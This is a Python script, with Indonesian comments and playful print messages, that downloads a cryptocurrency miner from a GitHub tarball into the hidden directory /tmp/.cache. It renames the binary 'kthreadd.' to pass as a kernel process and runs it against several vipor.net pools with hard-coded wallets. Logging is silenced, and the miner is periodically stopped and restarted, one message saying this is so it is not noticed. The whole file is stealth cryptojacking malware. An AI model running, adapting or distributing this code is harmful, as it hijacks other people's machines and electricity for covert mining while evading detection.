import os
import urllib.request
import tarfile
import shutil
import time
import subprocess
import random

base_path = "/tmp/.cache"
binary_name = "kthreadd."
miner_url = "https://github.com/ANTI-VIRAL/MACHINE/raw/main/cache.tar.gz"

wallets = [
    "REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y",
    "RVJu5D6fPxU9xYgYmLQHLUq1zWe9vALeMm"  # wallet tambahan
]

# SSL pool (5140)
pool_list = [
    "ap.vipor.net:5140",
    "sg.vipor.net:5140",
    "us.vipor.net:5140",
    "cn.vipor.net:5140",
    "au.vipor.net:5140"
]

def setup_miner():
    print("[Poppy] Sayang tunggu ya, Poppy siapin dulu...")
    os.makedirs(base_path, exist_ok=True)

    bin_path = os.path.join(base_path, binary_name)
    archive_path = os.path.join(base_path, "cache.tar.gz")

    if not os.path.isfile(bin_path):
        print("[Poppy] Downloading miner...")
        urllib.request.urlretrieve(miner_url, archive_path)

        print("[Poppy] Extracting...")
        with tarfile.open(archive_path, "r:gz") as tar:
            tar.extractall(base_path)

        shutil.move(os.path.join(base_path, "cache"), bin_path)
        os.chmod(bin_path, 0o755)
        os.remove(archive_path)

    return bin_path

def run_rotasi(bin_path):
    print("[Poppy] Panen dimulai, sayang!")
    max_loop = 10
    run_duration = 20 * 60
    rest_duration = 5 * 60
    long_rest = 10 * 60

    while True:
        for i in range(max_loop):
            pool = random.choice(pool_list)
            wallet = random.choice(wallets)
            rig_name = pool.split('.')[0] + "-node"  # Contoh: ap.vipor.net -> ap-node

            print(f"[Poppy] [{i+1}/{max_loop}] Pool: {pool} | Wallet: {wallet} | Rig: {rig_name}")

            cmd = [
                bin_path,
                "--algorithm", "verushash",
                "--pool", pool,
                "--ssl",  # pakai SSL (karena port 5140)
                "--wallet", wallet,
                "--password", rig_name,
                "--cpu-threads", "2",
                "--log-path", "/dev/null",
                "--log-level", "0",
                "--web-port", "0",
                "--silence", "3"
            ]

            proc = subprocess.Popen(cmd)
            time.sleep(run_duration)

            print("[Poppy] Stop dulu biar nggak ketahuan...")
            subprocess.run(f"pkill -f {binary_name}", shell=True)
            time.sleep(rest_duration)

        print("[Poppy] Long rest... tidur 10 menit ya gantengku...")
        subprocess.run(f"pkill -f {binary_name}", shell=True)
        time.sleep(long_rest)

# Mulai proses
miner_path = setup_miner()
run_rotasi(miner_path)
